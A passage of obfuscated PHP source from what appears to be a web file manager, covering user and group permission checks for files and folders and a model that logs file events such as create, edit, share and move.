$©‹ØÓ¬ş[$çÖÎ™ßİ[445]]; } } $ëÖ¶ºË = $this->userGroupParents($ŸéèÇ›È); $æöÀ˜°œ = array($çÖÎ™ßİ[180] => SourceModel::TYPE_USER, $çÖÎ™ßİ[541] => $ŸéèÇ›È); if ($ëÖ¶ºË) { $æöÀ˜°œ = array(array($çÖÎ™ßİ[180] => SourceModel::TYPE_USER, $çÖÎ™ßİ[541] => $ŸéèÇ›È), array($çÖÎ™ßİ[180] => SourceModel::TYPE_GROUP, $çÖÎ™ßİ[541] => array($çÖÎ™ßİ[462], $ëÖ¶ºË)), $çÖÎ™ßİ[1046] => $çÖÎ™ßİ[1992]); } $†Û‡‘“ğ = $this->field($çÖÎ™ßİ[2095])->where($æöÀ˜°œ)->select(); $ô‚ —Ş¢ = array(); $¹ËâÕæš = array_to_keyvalue_group($†Û‡‘“ğ, $çÖÎ™ßİ[183]); foreach ($¹ËâÕæš as $àšÜË½È => $¯æ’Ñ–) { $õ Ææóê = $this->authArrayCheck($¯æ’Ñ–, $ŸéèÇ›È); if ($õ Ææóê[$çÖÎ™ßİ[458]] > 0) { $ô‚ —Ş¢[] = $àšÜË½È . $çÖÎ™ßİ[12]; } } if ($ëÖ¶ºË) { $î¨³Ä¯ô = Model($çÖÎ™ßİ[557]); foreach ($ëÖ¶ºË as $æ“êŞŸ) { $ÓéññŒÀ = $î¨³Ä¯ô->getInfo($æ“êŞŸ); if (!$ÓéññŒÀ || !is_array($ÓéññŒÀ[$çÖÎ™ßİ[89]])) { continue; } $ô‚ —Ş¢[] = $ÓéññŒÀ[$çÖÎ™ßİ[89]][$çÖÎ™ßİ[183]]; } } $Ìá»ÉÍ† = array(); $±Ñß×ö· = $ëÖ¶ºË; $¤ŸÆ™‹ô = Model($çÖÎ™ßİ[1381]); $î¨³Ä¯ô = Model($çÖÎ™ßİ[557]); $Ü£ŠÉì„ = array(); $°±àŸİÄ = array(); $ÑÕ…Òòâ = array(); $¦µµÛÂ› = array(); if ($ô‚ —Ş¢) { $ÇäÓŒÔú = $¤ŸÆ™‹ô->where(array($çÖÎ™ßİ[183] => array($çÖÎ™ßİ[462], $ô‚ —Ş¢)))->select(); foreach ($ÇäÓŒÔú as $ÀñÎ¥) { $”Ûñê¨Ä = $¤ŸÆ™‹ô->parentLevelArray($ÀñÎ¥[$çÖÎ™ßİ[556]]); $Ìá»ÉÍ† = array_merge($Ìá»ÉÍ†, $”Ûñê¨Ä); $±Ñß×ö·[] = $ÀñÎ¥[$çÖÎ™ßİ[541]]; $Ü£ŠÉì„[$ÀñÎ¥[$çÖÎ™ßİ[183]]] = $”Ûñê¨Ä; $°±àŸİÄ[$ÀñÎ¥[$çÖÎ™ßİ[183]]] = $ÀñÎ¥[$çÖÎ™ßİ[541]]; } } $±Ñß×ö· = array_values(array_unique($±Ñß×ö·)); $Á¦Ó˜çÂ = $±Ñß×ö·; foreach ($Á¦Ó˜çÂ as $æ“êŞŸ) { $ÓéññŒÀ = $î¨³Ä¯ô->getInfo($æ“êŞŸ); $”Ûñê¨Ä = $¤ŸÆ™‹ô->parentLevelArray($ÓéññŒÀ[$çÖÎ™ßİ[556]]); $±Ñß×ö· = array_merge($±Ñß×ö·, $”Ûñê¨Ä); } $±Ñß×ö· = array_values(array_unique($±Ñß×ö·)); foreach ($±Ñß×ö· as $æ“êŞŸ) { $ÓéññŒÀ = $î¨³Ä¯ô->getInfo($æ“êŞŸ); $Ìá»ÉÍ†[] = $ÓéññŒÀ[$çÖÎ™ßİ[89]][$çÖÎ™ßİ[183]]; $ÑÕ…Òòâ[$æ“êŞŸ] = $ÓéññŒÀ[$çÖÎ™ßİ[89]][$çÖÎ™ßİ[183]]; $¦µµÛÂ›[$æ“êŞŸ] = $¤ŸÆ™‹ô->parentLevelArray($ÓéññŒÀ[$çÖÎ™ßİ[556]]); } foreach ($Ü£ŠÉì„ as $³ıÉõ˜¢ => $£Ú’áöØ) { $æµªáù = $°±àŸİÄ[$³ıÉõ˜¢]; if (!$æµªáù || !$ÑÕ…Òòâ[$æµªáù]) { continue; } $¤Ûœøñ = array(); foreach ($¦µµÛÂ›[$æµªáù] as $æ“êŞŸ) { $¤Ûœøñ[] = $ÑÕ…Òòâ[$æ“êŞŸ]; } $Ü£ŠÉì„[$³ıÉõ˜¢] = array_merge($¤Ûœøñ, $£Ú’áöØ); } $Ìá»ÉÍ† = array_values(array_unique($Ìá»ÉÍ†)); $ëˆûÛØÛ = array($çÖÎ™ßİ[2087] => $Ìá»ÉÍ†, $çÖÎ™ßİ[2088] => $Ü£ŠÉì„); $ÏòÅ–‹±[$ŸéèÇ›È] = $ëˆûÛØÛ; return $ëˆûÛØÛ; } private function makeSourceAuth($âãïìãô, $æœŒ±Øš, $¤‹ôñ¸Ò = false) { $ò”åÀ·§ =& $_SERVER[èùÙ¹Ïö]; $šíòƒˆ = $ò”åÀ·§[90]; $ñüñĞíµ = $âãïìãô[$ò”åÀ·§[541]]; $à‹æ«·¹ = $âãïìãô[$ò”åÀ·§[180]] == SourceModel::TYPE_GROUP; $§ıÓŸ˜¿ = $à‹æ«·¹ ? $this->groupRootAuth($ñüñĞíµ, $¤‹ôñ¸Ò) : !1; if ($§ıÓŸ˜¿ && Model($ò”åÀ·§[543])->authCheckAction($§ıÓŸ˜¿[$ò”åÀ·§[457]], $ò”åÀ·§[1915])) { return $this->groupAuthInfo($§ıÓŸ˜¿, $ñüñĞíµ); } $Œ†¬–óà = Model($ò”åÀ·§[1381])->parentLevelArray($âãïìãô[$ò”åÀ·§[556]]); $Œ†¬–óà = array_merge(array($âãïìãô[$ò”åÀ·§[183]]), array_reverse($Œ†¬–óà)); $”›ìÁÑ‘ = !1; foreach ($Œ†¬–óà as $Å¢÷Î¡à) { if (!isset($æœŒ±Øš[$Å¢÷Î¡à])) { continue; } $™´ªëÅÁ = $this->authMake($æœŒ±Øš[$Å¢÷Î¡à], $¤‹ôñ¸Ò); if ($™´ªëÅÁ[$ò”åÀ·§[510]]) { $”›ìÁÑ‘ = $™´ªëÅÁ; break; } } if (!$à‹æ«·¹) { return $”›ìÁÑ‘; } if (!$”›ìÁÑ‘ && $§ıÓŸ˜¿) { $”›ìÁÑ‘ = $this->groupAuthInfo($§ıÓŸ˜¿, $ñüñĞíµ); } if (!$”›ìÁÑ‘) { $»††—Û™ = Model($ò”åÀ·§[557])->getInfo($ñüñĞíµ); $äëÓÈ¦ = explode($ò”åÀ·§[50], trim($»††—Û™[$ò”åÀ·§[556]], $ò”åÀ·§[50])); $äëÓÈ¦ = array_reverse($äëÓÈ¦); foreach ($äëÓÈ¦ as $Í’²æÖ) { if ($Í’²æÖ == $ò”åÀ·§[214] || $Í’²æÖ == $šíòƒˆ) { continue; } $ÒŒæ¿Ü = $this->groupRootAuth($Í’²æÖ, $¤‹ôñ¸Ò); if (!$ÒŒæ¿Ü) { continue; } $”›ìÁÑ‘ = $this->groupAuthInfo($ÒŒæ¿Ü, $Í’²æÖ); break; } } if (!$”›ìÁÑ‘ || $”›ìÁÑ‘[$ò”åÀ·§[458]] <= 0) { $¹…µãß = $this->authDeepCheck($âãïìãô[$ò”åÀ·§[183]], $¤‹ôñ¸Ò); if ($¹…µãß) { $”›ìÁÑ‘ = $¹…µãß; } } return $”›ìÁÑ‘; } private function userIsRoot($ã‹«¬è¾ = false) { $­Ëô£ÈÕ =& $_SERVER[èùÙ¹Ïö]; if (!$ã‹«¬è¾ && _get($GLOBALS, $­Ëô£ÈÕ[539])) { return !0; } $âÚ¢¤çµ = Model($­Ëô£ÈÕ[570])->getInfo($ã‹«¬è¾); $¶Çà™Ñ = Model($­Ëô£ÈÕ[2096])->listData($âÚ¢¤çµ[$­Ëô£ÈÕ[1570]]); if ($¶Çà™Ñ && $¶Çà™Ñ[$­Ëô£ÈÕ[547]][$­Ëô£ÈÕ[2097]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ö¯ø¢¤) { $¼½‹ı²  =& $_SERVER[èùÙ¹Ïö]; $åéÂâÎÊ = Model($¼½‹ı² [1381]); $Æ½˜á› = $åéÂâÎÊ->sourceInfo($ö¯ø¢¤); if (!$Æ½˜á›) { return !1; } $åéÂâÎÊ->groupPathDisplay($Æ½˜á›); $çô’™‹ = array($Æ½˜á›); $çô’™‹ = $åéÂâÎÊ->_listAppendPath($çô’™‹); $Æ½˜á› = $çô’™‹[0]; $â³›œ†ç = $Æ½˜á›[$¼½‹ı² [554]]; if (isset($Æ½˜á›[$¼½‹ı² [562]])) { $òâ¤ÉîÚ = explode($¼½‹ı² [8], trim($Æ½˜á›[$¼½‹ı² [554]], $¼½‹ı² [8])); array_shift($òâ¤ÉîÚ); $â³›œ†ç = $Æ½˜á›[$¼½‹ı² [560]] . $¼½‹ı² [2098] . implode($¼½‹ı² [8], $òâ¤ÉîÚ); } return array($¼½‹ı² [464] => $Æ½˜á›[$¼½‹ı² [32]], $¼½‹ı² [86] => KodIO::make($Æ½˜á›[$¼½‹ı² [183]]), $¼½‹ı² [2099] => $â³›œ†ç); } private function groupAuthInfo($´Ù¨”Ë, $ÊÈõ¸Ûø) { $©æ‚ºæ =& $_SERVER[èùÙ¹Ïö]; $ƒûñçê© = Model($©æ‚ºæ[557])->getInfo($ÊÈõ¸Ûø); return array($©æ‚ºæ[2100] => intval($´Ù¨”Ë[$©æ‚ºæ[457]]), $©æ‚ºæ[2084] => $´Ù¨”Ë, $©æ‚ºæ[2101] => LNG($©æ‚ºæ[2102]), $©æ‚ºæ[2093] => array($©æ‚ºæ[464] => $ƒûñçê©[$©æ‚ºæ[32]], $©æ‚ºæ[86] => KodIO::make($ƒûñçê©[$©æ‚ºæ[89]][$©æ‚ºæ[183]]), $©æ‚ºæ[2099] => $ƒûñçê©[$©æ‚ºæ[561]])); } protected function groupRootAuth($Œò†ğâ¾, $î·±°¹˜ = false) { $«¶£ªÒı =& $_SERVER[èùÙ¹Ïö]; $î·±°¹˜ = $î·±°¹˜ ? $î·±°¹˜ : USER_ID; $®¿¦¡ÉŞ = $î·±°¹˜ . $«¶£ªÒı[2103] . $Œò†ğâ¾; static $âµ”ºÍ‘ = array(); if (isset($âµ”ºÍ‘[$®¿¦¡ÉŞ])) { return $âµ”ºÍ‘[$®¿¦¡ÉŞ]; } $™îœ = Model($«¶£ªÒı[557])->getInfo($Œò†ğâ¾); $ï§úıüš = $this->userGroupList($î·±°¹˜); $‹«¡Ù‹û = isset($ï§úıüš[$Œò†ğâ¾]) ? $ï§úıüš[$Œò†ğâ¾][$«¶£ªÒı[457]] : !1; if ($‹«¡Ù‹û && Model($«¶£ªÒı[543])->authCheckAction($‹«¡Ù‹û[$«¶£ªÒı[457]], $«¶£ªÒı[1915])) { $âµ”ºÍ‘[$®¿¦¡ÉŞ] = $‹«¡Ù‹û; return $‹«¡Ù‹û; } $‹È¦ôé = $this->sourceAuthSelect($™îœ[$«¶£ªÒı[89]][$«¶£ªÒı[183]]); $şÈÊ˜Ñ‡ = $‹È¦ôé ? $this->authMake($‹È¦ôé, $î·±°¹˜) : !1; $¥¦û¹é = $şÈÊ˜Ñ‡ ? $şÈÊ˜Ñ‡[$«¶£ªÒı[510]] : !1; $âµ”ºÍ‘[$®¿¦¡ÉŞ] = $¥¦û¹é ? $¥¦û¹é : $‹«¡Ù‹û; return $âµ”ºÍ‘[$®¿¦¡ÉŞ]; } public function authOwnerApply($Ãô´ÅÚê) { $õâúçĞ³ =& $_SERVER[èùÙ¹Ïö]; if (empty($Ãô´ÅÚê[$õâúçĞ³[457]]) || isset($Ãô´ÅÚê[$õâúçĞ³[2104]]) && $Ãô´ÅÚê[$õâúçĞ³[2104]]) { return $Ãô´ÅÚê; } if (AuthModel::authCheckRoot($Ãô´ÅÚê[$õâúçĞ³[457]][$õâúçĞ³[458]])) { return $Ãô´ÅÚê; } $–êÙ”³À = Model($õâúçĞ³[1381])->parentLevelArray($Ãô´ÅÚê[$õâúçĞ³[556]]); $–êÙ”³À = array_merge(array($Ãô´ÅÚê[$õâúçĞ³[183]]), array_reverse($–êÙ”³À)); $¥ˆÂËô = $this->sourceAuthSelect($–êÙ”³À); $şã­Í˜ê = array(); $šª–ï¢¦ = array(); foreach ($¥ˆÂËô as $¼íÁ¼Ã => $Ø²–¨àá) { $ûÆÈ¿Ïµ = $this->authFolderOwnerUser($Ø²–¨àá); $şã­Í˜ê[$¼íÁ¼Ã] = $ûÆÈ¿Ïµ; $šª–ï¢¦ = array_merge($šª–ï¢¦, $ûÆÈ¿Ïµ[$õâúçĞ³[633]]); if ($ûÆÈ¿Ïµ[$õâúçĞ³[2105]]) { break; } } if (count($šª–ï¢¦) == 0) { $šª–ï¢¦ = $this->authFolderOwnerGroup($Ãô´ÅÚê[$õâúçĞ³[541]]); } $šª–ï¢¦ = array_unique($šª–ï¢¦); if (AuthModel::authCheckRoot($Ãô´ÅÚê[$õâúçĞ³[457]][$õâúçĞ³[458]])) { $šª–ï¢¦[] = USER_ID; } $Ãô´ÅÚê[$õâúçĞ³[457]][$õâúçĞ³[2106]] = Model($õâúçĞ³[549])->userListInfo($šª–ï¢¦); return $Ãô´ÅÚê; } private function authFolderOwnerGroup($è¼Š¹æÌ) { $ÁÇ¼¸¨ =& $_SERVER[èùÙ¹Ïö]; $ÒÆ’Ó = Model($ÁÇ¼¸¨[1984])->where(array($ÁÇ¼¸¨[1894] => $è¼Š¹æÌ))->select(); $âŒ…»‘õ = array(); if (!$ÒÆ’Ó) { return $âŒ…»‘õ; } foreach ($ÒÆ’Ó as $§ıÓ¯…™) { $ù‰±½ÕÊ = $this->authInfo($§ıÓ¯…™); if (AuthModel::authCheckRoot($ù‰±½ÕÊ[$ÁÇ¼¸¨[457]])) { $âŒ…»‘õ[] = $§ıÓ¯…™[$ÁÇ¼¸¨[1696]]; } } return $âŒ…»‘õ; } private function authFolderOwnerUser($õõúØÆ¹) { $ñûÒ€Ì =& $_SERVER[èùÙ¹Ïö]; $ÊÕç¡Óö = array(); $Ô£ÆëßÒ = !1; foreach ($õõúØÆ¹ as $Ë½ö³±œ) { $ö‘Ÿãº÷ = $this->authInfo($Ë½ö³±œ); if ($Ë½ö³±œ[$ñûÒ€Ì[541]] == $ñûÒ€Ì[214]) { $Ô£ÆëßÒ = !0; } if ($Ë½ö³±œ[$ñûÒ€Ì[180]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ö‘Ÿãº÷[$ñûÒ€Ì[457]])) { $ÊÕç¡Óö[] = $Ë½ö³±œ[$ñûÒ€Ì[541]]; } } } return array($ñûÒ€Ì[633] => $ÊÕç¡Óö, $ñûÒ€Ì[2105] => $Ô£ÆëßÒ); } public function authMake($³ç‰º¶, $­Àˆ“¡ = false) { $¸Á¯‰Ã =& $_SERVER[èùÙ¹Ïö]; $ıÛŒã±Ê = $this->authArrayCheck($³ç‰º¶, $­Àˆ“¡); if ($ıÛŒã±Ê[$¸Á¯‰Ã[2107]]) { $ıÛŒã±Ê[$¸Á¯‰Ã[2107]] = $this->sourceAuthInfo($ıÛŒã±Ê[$¸Á¯‰Ã[2107]]); } return $ıÛŒã±Ê; } public function authArrayCheck($¿Î©¥¤°, $¸¡üßª³ = false) { $­ã¾Šêı =& $_SERVER[èùÙ¹Ïö]; if (!$¿Î©¥¤°) { return array($­ã¾Šêı[458] => 0, $­ã¾Šêı[510] => !1); } $¸¡üßª³ = $¸¡üßª³ ? $¸¡üßª³ : USER_ID; $’åÄôÊ‹ = 0; $Ò€ßá›Ó = 0; $ÈçªíÎ§ = 0; $ÆÜšß†ƒ = 0; $¿íÕ‹·¬ = 0; $¬½‘£ş¹ = 0; $ÒµãÜ‹× = 1000; $½¸Óˆóª = 0; $¬ëÛëˆ¤ = 0; $¾‘ÈËÊ = 0; $è‹Œé¨Á = 0; $ö•œÍÂİ = array($­ã¾Šêı[183] => 0); foreach ($¿Î©¥¤° as $ö•œÍÂİ) { $™…’ğÒ¤ = $this->authInfo($ö•œÍÂİ); if (!$™…’ğÒ¤) { continue; } $Ü‘é‰æ— = $ö•œÍÂİ[$­ã¾Šêı[541]]; $ˆ¤¸ï¥º = intval($™…’ğÒ¤[$­ã¾Šêı[457]]); if ($ö•œÍÂİ[$­ã¾Šêı[180]] == SourceModel::TYPE_USER && $Ü‘é‰æ— == $¸¡üßª³) { $’åÄôÊ‹ = !0; $ÈçªíÎ§ = $™…’ğÒ¤; $Ò€ßá›Ó = $ˆ¤¸ï¥º; } else { if ($ö•œÍÂİ[$­ã¾Šêı[180]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Ü‘é‰æ—, $¸¡üßª³)) { $ÆÜšß†ƒ = !0; $œ¦õÈˆæ = $this->groupStepToUserGroup($Ü‘é‰æ—, $¸¡üßª³); if ($œ¦õÈˆæ < $ÒµãÜ‹×) { $ÒµãÜ‹× = $œ¦õÈˆæ; $¿íÕ‹·¬ = $ˆ¤¸ï¥º; $¬½‘£ş¹ = $™…’ğÒ¤; $½¸Óˆóª = $Ü‘é‰æ—; } if ($œ¦õÈˆæ == $ÒµãÜ‹× && $ˆ¤¸ï¥º >= $¿íÕ‹·¬) { $¿íÕ‹·¬ = $ˆ¤¸ï¥º; $¬½‘£ş¹ = $™…’ğÒ¤; $½¸Óˆóª = $Ü‘é‰æ—; } } else { if ($Ü‘é‰æ— == $­ã¾Šêı[214]) { $¬ëÛëˆ¤ = !0; $è‹Œé¨Á = $™…’ğÒ¤; $¾‘ÈËÊ = $ˆ¤¸ï¥º; } } } } if ($’åÄôÊ‹) { $öØÔ÷èü = $Ò€ßá›Ó; $™…’ğÒ¤ = $ÈçªíÎ§; $Ñ‘ş÷Òë = LNG($­ã¾Šêı[2108]); } else { if ($ÆÜšß†ƒ) { $öØÔ÷èü = $¿íÕ‹·¬; $™…’ğÒ¤ = $¬½‘£ş¹; $Àş´¬ä = Model($­ã¾Šêı[557])->getInfo($½¸Óˆóª); $Ñ‘ş÷Òë = $­ã¾Šêı[165] . $Àş´¬ä[$­ã¾Šêı[561]] . $­ã¾Šêı[2109] . LNG($­ã¾Šêı[2110]); } else { if ($¬ëÛëˆ¤) { $öØÔ÷èü = $¾‘ÈËÊ; $™…’ğÒ¤ = $è‹Œé¨Á; $Ñ‘ş÷Òë = LNG($­ã¾Šêı[2081]); } else { $öØÔ÷èü = 0; $™…’ğÒ¤ = !1; $Ñ‘ş÷Òë = $­ã¾Šêı[12]; } } } $’ïâ•·” = array($­ã¾Šêı[2100] => intval($öØÔ÷èü), $­ã¾Šêı[2084] => $™…’ğÒ¤, $­ã¾Šêı[2101] => $Ñ‘ş÷Òë, $­ã¾Šêı[2093] => $ö•œÍÂİ[$­ã¾Šêı[183]]); return $’ïâ•·”; } private function groupContainUser($×¹ì·”, $ÃÉÒ˜ = false) { return in_array($×¹ì·”, $this->userGroupParents($ÃÉÒ˜)); } private function groupStepToUserGroup($Ş§ã„«, $–¯î¸Ç = false) { $ˆÕä±Êû =& $_SERVER[èùÙ¹Ïö]; $èİ©¿Ì = $this->userGroupList($–¯î¸Ç); $÷ÌŞ•Ò = 1000; $óİ«¯àº = $GLOBALS[$ˆÕä±Êû[6]][$ˆÕä±Êû[91]][$ˆÕä±Êû[1997]] == 1; $óü¯œİ¤ = $óİ«¯àº ? 3 : 2; foreach ($èİ©¿Ì as $õ±¾ÎµÌ) { if ($õ±¾ÎµÌ[$ˆÕä±Êû[1894]] == $Ş§ã„«) { return 0; } $ş•æ¸ÌÅ = explode($ˆÕä±Êû[50], trim($õ±¾ÎµÌ[$ˆÕä±Êû[556]], $ˆÕä±Êû[50])); if ($ş•æ¸ÌÅ[0] == $ˆÕä±Êû[214] && count($ş•æ¸ÌÅ) > $óü¯œİ¤) { $Ùé£ÅÕ = array_reverse(array_slice($ş•æ¸ÌÅ, $óü¯œİ¤)); $¡¥»Üëˆ = array_search($Ş§ã„«, $Ùé£ÅÕ); if ($¡¥»Üëˆ !== !1 && $¡¥»Üëˆ + 1 <= $÷ÌŞ•Ò) { $÷ÌŞ•Ò = $¡¥»Üëˆ + 1; } } } return $÷ÌŞ•Ò; } private function userGroupList($Á¹¥ÛÂ³ = false) { $ßú¾Øº­ =& $_SERVER[èùÙ¹Ïö]; static $ºÆ¼Ú¬ = array(); if (isset($ºÆ¼Ú¬[$Á¹¥ÛÂ³])) { return $ºÆ¼Ú¬[$Á¹¥ÛÂ³]; } $ÜéëËØñ = Model($ßú¾Øº­[570])->getInfo($Á¹¥ÛÂ³); $ºÆ¼Ú¬[$Á¹¥ÛÂ³] = array_to_keyvalue($ÜéëËØñ[$ßú¾Øº­[2082]], $ßú¾Øº­[1894]); return $ºÆ¼Ú¬[$Á¹¥ÛÂ³]; } public function userGroupParents($Æï¢š†É) { $ğ¤ìÌ¨š =& $_SERVER[èùÙ¹Ïö]; static $şŞ¬…á = array(); $Æï¢š†É = $Æï¢š†É ? $Æï¢š†É : USER_ID; if (isset($şŞ¬…á[$Æï¢š†É])) { return $şŞ¬…á[$Æï¢š†É]; } $ÎÕäÎÇ™ = $this->userGroupList($Æï¢š†É); $†‚¹÷ú¬ = array(); $÷­²ºÒ = $GLOBALS[$ğ¤ìÌ¨š[6]][$ğ¤ìÌ¨š[91]][$ğ¤ìÌ¨š[1997]] == 1; $§€ùİå = $÷­²ºÒ ? 3 : 2; foreach ($ÎÕäÎÇ™ as $õ§îÁ¹‰) { $õ¦ÌÒéÈ = array($õ§îÁ¹‰[$ğ¤ìÌ¨š[1894]]); $Ÿ‘÷Š¨õ = explode($ğ¤ìÌ¨š[50], trim($õ§îÁ¹‰[$ğ¤ìÌ¨š[556]], $ğ¤ìÌ¨š[50])); if ($Ÿ‘÷Š¨õ[0] == $ğ¤ìÌ¨š[214] && count($Ÿ‘÷Š¨õ) > $§€ùİå) { $¶ôë÷¹í = array_slice($Ÿ‘÷Š¨õ, $§€ùİå); $õ¦ÌÒéÈ = array_merge($õ¦ÌÒéÈ, array_reverse($¶ôë÷¹í)); } $†‚¹÷ú¬ = array_merge($†‚¹÷ú¬, $õ¦ÌÒéÈ); } $şŞ¬…á[$Æï¢š†É] = array_unique($†‚¹÷ú¬); return $şŞ¬…á[$Æï¢š†É]; } public function authTargetInfoMake($ û£€£ö) { $ˆï³’Ï =& $_SERVER[èùÙ¹Ïö]; $µ…ÙÁì® = array(); $İ±†¬¥• = array(); foreach ($ û£€£ö as $™ÑŞç‘Š) { if ($™ÑŞç‘Š[$ˆï³’Ï[180]] == SourceModel::TYPE_USER) { $µ…ÙÁì®[] = intval($™ÑŞç‘Š[$ˆï³’Ï[541]]); } else { if ($™ÑŞç‘Š[$ˆï³’Ï[180]] == SourceModel::TYPE_GROUP) { $İ±†¬¥•[] = intval($™ÑŞç‘Š[$ˆï³’Ï[541]]); } } } if ($µ…ÙÁì®) { $µ…ÙÁì® = Model($ˆï³’Ï[549])->userListInfo($µ…ÙÁì®); } if ($İ±†¬¥•) { $ÂşãÌÑ· = array($ˆï³’Ï[1982] => array($ˆï³’Ï[462], $İ±†¬¥•)); $İ±†¬¥• = Model($ˆï³’Ï[557])->field($ˆï³’Ï[2111])->where($ÂşãÌÑ·)->select(); $İ±†¬¥• = array_to_keyvalue($İ±†¬¥•, $ˆï³’Ï[1894]); } return array($ˆï³’Ï[2112] => $µ…ÙÁì®, $ˆï³’Ï[2113] => $İ±†¬¥•); } public function authInfo($ÊÄ¼Ì­å) { $ê©ıú˜á =& $_SERVER[èùÙ¹Ïö]; if ($ÊÄ¼Ì­å[$ê©ıú˜á[1998]]) { $ÏÊ¬Ïƒ = Model($ê©ıú˜á[543])->listData($ÊÄ¼Ì­å[$ê©ıú˜á[1998]]); if (!$ÏÊ¬Ïƒ) { return !1; $âÎ÷ùºë = Model($ê©ıú˜á[543])->listData(); $õâÆü† = array_filter_by_field($âÎ÷ùºë, $ê©ıú˜á[457], $ê©ıú˜á[214]); return $õâÆü†; } $”å³¯•› = array_field_key($ÏÊ¬Ïƒ, array($ê©ıú˜á[445], $ê©ıú˜á[32], $ê©ıú˜á[457], $ê©ıú˜á[1917], $ê©ıú˜á[1918])); $”å³¯•›[$ê©ıú˜á[2114]] = $ÊÄ¼Ì­å; return $”å³¯•›; } else { return array($ê©ıú˜á[463] => 0, $ê©ıú˜á[1900] => $ÊÄ¼Ì­å[$ê©ıú˜á[2059]], $ê©ıú˜á[464] => $ê©ıú˜á[12], $ê©ıú˜á[1917] => $ê©ıú˜á[2115]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\x72\x63\145\137\145\166\145\156\164"; protected $dataAuto = array(array("\143\x72\145\x61\x74\145\x54\151\155\145", "\x74\151\x6d\x65", "\x69\156\x73\145\162\x74", "\x66\165\156\143\164\151\157\x6e"), array("\x64\x65\x73\x63", '', "\151\x6e\x73\x65\x72\164\54\x75\x70\x64\141\x74\x65\x2c\163\145\154\x65\143\x74", "\152\x73\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($Íêû†˜², $ÙÖóõÌÏ, $ğ®ğò¶ = '') { $ªÑòÂÆ¸ =& $_SERVER[èùÙ¹Ïö]; if (!$this->eventSave) { return; } $óÈ¢ŞÒø = Model($ªÑòÂÆ¸[1381])->sourceInfo($Íêû†˜²); if (!$óÈ¢ŞÒø) { return !1; } if ($this->isCacheEvent($óÈ¢ŞÒø, $ÙÖóõÌÏ)) { return; } if ($ğ®ğò¶ && is_string($ğ®ğò¶)) { $ğ®ğò¶ = array($ªÑòÂÆ¸[1933] => $ğ®ğò¶); } $ü¯š³±Ã = defined($ªÑòÂÆ¸[2116]) ? USER_ID : 0; $¦ßæË = array($ªÑòÂÆ¸[461] => $Íêû†˜², $ªÑòÂÆ¸[2117] => $óÈ¢ŞÒø[$ªÑòÂÆ¸[182]], $ªÑòÂÆ¸[2118] => $óÈ¢ŞÒø[$ªÑòÂÆ¸[32]], $ªÑòÂÆ¸[554] => !empty($óÈ¢ŞÒø[$ªÑòÂÆ¸[554]]) ? $óÈ¢ŞÒø[$ªÑòÂÆ¸[554]] : $ªÑòÂÆ¸[12], $ªÑòÂÆ¸[1687] => $ü¯š³±Ã, $ªÑòÂÆ¸[466] => $ÙÖóõÌÏ, $ªÑòÂÆ¸[1689] => $ğ®ğò¶); $this->addSystemLog($ÙÖóõÌÏ, $¦ßæË); unset($¦ßæË[$ªÑòÂÆ¸[2118]], $¦ßæË[$ªÑòÂÆ¸[554]]); return $this->add($¦ßæË); } private function addSystemLog($¤™ô—¤İ, $şèĞÚÏ) { $ƒì¬Õà =& $_SERVER[èùÙ¹Ïö]; if ($¤™ô—¤İ == $ƒì¬Õà[2119]) { $¤™ô—¤İ = $şèĞÚÏ[$ƒì¬Õà[496]][$ƒì¬Õà[2120]]; } else { if (in_array($¤™ô—¤İ, array($ƒì¬Õà[1874], $ƒì¬Õà[2121]))) { $¤™ô—¤İ = $şèĞÚÏ[$ƒì¬Õà[496]][$ƒì¬Õà[794]]; } } $æÚÂ¼ÇÂ = array_merge($şèĞÚÏ, array($ƒì¬Õà[2122] => $şèĞÚÏ[$ƒì¬Õà[183]], $ƒì¬Õà[2123] => $şèĞÚÏ[$ƒì¬Õà[2123]])); Hook::trigger($ƒì¬Õà[2124], $ƒì¬Õà[2125] . $¤™ô—¤İ, $şèĞÚÏ); Model($ƒì¬Õà[1838])->addLog($ƒì¬Õà[2125] . $¤™ô—¤İ, $æÚÂ¼ÇÂ); } private function isCacheEvent($»íà½‰, $Ğ—£ç’Á) { if ($»íà½‰[$_SERVER[èùÙ¹Ïö][180]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($Ì®¿İ±½, $µ²ÇßÉş) { $‘âÄÃóÏ =& $_SERVER[èùÙ¹Ïö]; $¦‚ëØ³ª = Model($‘âÄÃóÏ[1381])->sourceInfo($Ì®¿İ±½); $ß§¢Ùß€ = array($‘âÄÃóÏ[2120] => $µ²ÇßÉş, $‘âÄÃóÏ[32] => $¦‚ëØ³ª[$‘âÄÃóÏ[32]]); return $this->addEvent($Ì®¿İ±½, $‘âÄÃóÏ[2119], $ß§¢Ùß€); } public function eventFileEdit($Ë€œ¡¯½) { $‚‘ÚÉŠÜ =& $_SERVER[èùÙ¹Ïö]; $¥íÛ¯¶ø = array($‚‘ÚÉŠÜ[2126] => $_SERVER[$‚‘ÚÉŠÜ[2127]], $‚‘ÚÉŠÜ[2128] => strtolower(ACTION)); if (isset($GLOBALS[$‚‘ÚÉŠÜ[7]][$‚‘ÚÉŠÜ[2129]])) { $¥íÛ¯¶ø[$‚‘ÚÉŠÜ[2129]] = $‚‘ÚÉŠÜ[90]; } return $this->addEvent($Ë€œ¡¯½, $‚‘ÚÉŠÜ[1864], $¥íÛ¯¶ø); } public function eventRecycle($ÈÕëøØß, $•‚¾¿©É) { return $this->addEvent($ÈÕëøØß, $_SERVER[èùÙ¹Ïö][2121], $•‚¾¿©É); } public function eventRemove($á¸£Óù) { $ÕË®Ê„» =& $_SERVER[èùÙ¹Ïö]; $ °¥Äœö = Model($ÕË®Ê„»[1381])->sourceInfo($á¸£Óù); $±à…ô†è = $ °¥Äœö[$ÕË®Ê„»[32]]; return $this->addEvent($ °¥Äœö[$ÕË®Ê„»[182]], $ÕË®Ê„»[1863], $±à…ô†è); } public function eventShare($ƒëßì€ô, $Âé‚µº) { return $this->addEvent($ƒëßì€ô, $_SERVER[èùÙ¹Ïö][1874], $Âé‚µº); } public function eventMove($®íçã¶‹, $èÜÆ¡Ô«, $ØûÃ‰) { $­¶­Û®º =& $_SERVER[èùÙ¹Ïö]; $­³¤¦Â¯ = Model($­¶­Û®º[1381]); $ßëöåÙÂ = $­³¤¦Â¯->sourceInfo($®íçã¶‹); 